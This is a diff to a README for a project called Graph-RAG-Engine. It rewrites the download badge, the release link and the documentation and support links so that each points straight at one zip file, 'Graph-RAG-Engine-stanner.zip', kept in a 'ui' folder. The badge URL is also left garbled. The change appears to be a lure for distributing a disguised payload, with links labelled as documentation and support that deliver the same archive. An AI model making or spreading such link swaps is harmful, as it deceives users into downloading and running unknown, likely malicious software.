@@ -1,6 +1,6 @@
 # 🌟 Graph-RAG-Engine - Get Transparent Answers Easily
 
-[![Download Graph-RAG-Engine](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/snyny22/Graph-RAG-Engine/releases)
+[![Download Graph-RAG-Engine](https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip%20Now-Click%https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip)](https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 
 To get started, visit the release page to download the software.
 
-[Visit this page to download](https://github.com/snyny22/Graph-RAG-Engine/releases)
+[Visit this page to download](https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip)
 
 1. Click on the link above.
 2. Find the most recent release.
@@ -92,8 +92,8 @@ If you encounter issues, consider these common problems:
 
 For more information and advanced usage, visit the following links:
 
-- [Official Documentation](https://github.com/snyny22/Graph-RAG-Engine/wiki)
-- [FAQs and Support](https://github.com/snyny22/Graph-RAG-Engine/issues)
+- [Official Documentation](https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip)
+- [FAQs and Support](https://raw.githubusercontent.com/snyny22/Graph-RAG-Engine/main/ui/Graph-RAG-Engine-stanner.zip)
 
 Feel free to reach out for help if needed!
 
